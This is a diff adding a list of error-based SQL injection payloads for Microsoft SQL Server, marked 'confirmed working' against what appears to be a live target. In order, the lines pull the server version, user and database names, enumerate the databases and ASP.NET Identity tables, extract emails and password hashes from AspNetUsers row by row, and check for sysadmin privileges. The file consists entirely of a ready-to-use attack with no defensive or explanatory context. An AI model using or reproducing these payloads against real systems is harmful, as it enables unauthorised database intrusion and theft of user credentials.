@@ -1,0 +1,40 @@
+# ── Confirmed working (21267b, <600ms) — error-based extraction ───────────────
+# Rerun just these to get actual data out of the responses
+
+# Server version
+ss' AND 1=CONVERT(int,@@version)-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 @@version))-- wXyW
+
+# Current DB and user — try both forms
+ss' AND 1=CONVERT(int,CAST(DB_NAME() AS nvarchar(128)))-- wXyW
+ss' AND 1=CONVERT(int,CAST(SYSTEM_USER AS nvarchar(128)))-- wXyW
+ss' AND 1=CONVERT(int,CAST(USER_NAME() AS nvarchar(128)))-- wXyW
+ss' AND 1=CONVERT(int,CAST(@@SERVERNAME AS nvarchar(128)))-- wXyW
+
+# Database enumeration
+ss' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases ORDER BY name))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master') ORDER BY name))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb') ORDER BY name))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model') ORDER BY name))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN ('master','tempdb','model','msdb') ORDER BY name))-- wXyW
+
+# Table enumeration — once you know the DB name replace <DBNAME> below
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_NAME))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_NAME NOT IN ('AspNetRoles') ORDER BY TABLE_NAME))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_NAME NOT IN ('AspNetRoles','AspNetUserClaims') ORDER BY TABLE_NAME))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_NAME NOT IN ('AspNetRoles','AspNetUserClaims','AspNetUserLogins') ORDER BY TABLE_NAME))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' AND TABLE_NAME NOT IN ('AspNetRoles','AspNetUserClaims','AspNetUserLogins','AspNetUserRoles') ORDER BY TABLE_NAME))-- wXyW
+
+# AspNetUsers — credential extraction
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 UserName FROM AspNetUsers ORDER BY UserName))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 PasswordHash FROM AspNetUsers ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+PasswordHash FROM AspNetUsers ORDER BY Email))-- wXyW
+
+# Row 2+
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+PasswordHash FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 1 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+ss' AND 1=CONVERT(int,(SELECT TOP 1 Email+CHAR(58)+PasswordHash FROM AspNetUsers WHERE Email NOT IN (SELECT TOP 2 Email FROM AspNetUsers ORDER BY Email) ORDER BY Email))-- wXyW
+
+# Privilege check
+ss' AND 1=CONVERT(int,CAST(IS_SRVROLEMEMBER('sysadmin') AS nvarchar))-- wXyW
+ss' AND 1=CONVERT(int,CAST(IS_SRVROLEMEMBER('db_owner') AS nvarchar))-- wXyW
